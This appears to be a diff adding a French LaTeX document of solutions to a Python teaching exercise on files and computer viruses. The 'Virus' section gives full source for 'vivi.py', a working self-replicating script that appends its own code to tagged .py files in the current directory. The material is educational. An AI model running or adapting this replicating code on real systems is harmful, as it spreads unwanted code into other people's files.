@@ -1,0 +1,142 @@
+\section*{I. Fichiers et dossiers}
+Question 1.b.
+\begin{verbatim}
+# -*- coding: utf-8 -*-
+
+import os.path
+
+chemin_vers_mon_doss = os.getcwd()
+
+mes_voisins = os.listdir(chemin_vers_mon_doss)
+for machin in mes_voisins:
+    print machin  
+\end{verbatim}
+
+Question I.2.b.
+\begin{verbatim}
+import os.path
+chemin_vers_mon_doss = os.getcwd()
+
+mes_voisins = os.listdir(chemin_vers_mon_doss)
+
+for machin in mes_voisins:
+  if ( machin == 'alire.py'):
+    fifi = open(machin)
+    fifi_txt = fifi.read();
+    print(fifi_txt)
+    fifi.close()
+\end{verbatim}
+
+Question I.2.c.
+\begin{verbatim}
+# -*- coding: utf-8 -*-
+import os.path
+chemin_vers_mon_doss = os.getcwd()
+
+mes_voisins = os.listdir(chemin_vers_mon_doss)
+for machin in mes_voisins:
+  if ( machin == 'alire.py'):
+    fifi = open(machin)
+    # calcul du nb de lignes
+    i = 0
+    for lili in fifi:
+        i += 1
+    print("nb de lignes dans " + str(machin) + ": " + str(i))
+    print("5 dernières lignes")
+    deb = i - 5
+    fifi.seek(0)
+    i = 0
+    for lili in fifi:
+        if i >= deb:
+            print(lili)
+        i += 1
+    fifi.close()
+\end{verbatim}
+
+Question I.3.b.
+\begin{verbatim}
+# -*- coding: utf-8 -*-
+
+fifi = open("cible.py",'a')
+fifi.write("BLA BLA BLA")
+fifi.close()
+\end{verbatim}
+
+Question I.3.c
+\begin{verbatim}
+# -*- coding: utf-8 -*-
+fi_mess = open("message.py")
+mess_txt = fi_mess.read()
+
+fifi = open("cible.py",'a')
+fifi.write(mess_txt)
+fifi.close()
+\end{verbatim}
+
+\section*{II. Virus}
+Question II.1.b.
+\begin{verbatim}
+# -*- coding: utf-8 -*-
+
+import os.path
+
+print "###########\n exécution de "+ __file__
+chemin_vers_mon_doss = os.getcwd()
+mon_nom = os.path.basename(__file__)
+
+mes_voisins = os.listdir(chemin_vers_mon_doss)
+for machin in mes_voisins:
+    if machin == mon_nom:
+        machin += " : COUCOU c'est moi"
+    print machin  
+\end{verbatim}
+
+Le virus \verb|vivi.py| de la question 4.
+\begin{verbatim}
+#signature vivi.py gjhhjhggh
+
+sign = '#signature vivi.py gjhhjhggh'
+tag = '""" a infecter  """'
+
+import os.path
+chemin_vers_mon_doss = os.getcwd()
+mon_nom = os.path.basename(__file__)
+
+
+#recherche des cibles
+a_infecter = []
+mes_voisins = os.listdir(chemin_vers_mon_doss)
+for machin in mes_voisins:
+  if (os.path.splitext(machin)[1]=='.py' and machin != mon_nom):
+    fifi = open(machin)
+    fifi_txt = fifi.read();
+    if fifi_txt.find(sign) == -1 and fifi_txt.find(tag) != -1:
+      a_infecter.append(machin)
+    fifi.close()
+    
+#place ses p dernieres lignes dans une variable mon_texte
+p = 47
+mon_fifi = open(__file__)
+  #calcule le nb de lignes du fichier qui le contient
+i = 0
+for lili in mon_fifi:
+    i += 1
+#print i
+deb = i - p
+mon_texte = '\n\n#########infection par vivi.py \n\n'
+mon_fifi.seek(0)
+i = 0
+for lili in mon_fifi:
+    if i>= deb:
+        mon_texte += lili
+    i += 1
+#print mon_texte
+mon_fifi.close()
+
+#infection des cibles
+for machin in a_infecter:
+  print machin + " infecte"
+  fifi = open(machin,'a')
+  fifi.write(mon_texte)
+  fifi.close()
+\end{verbatim}
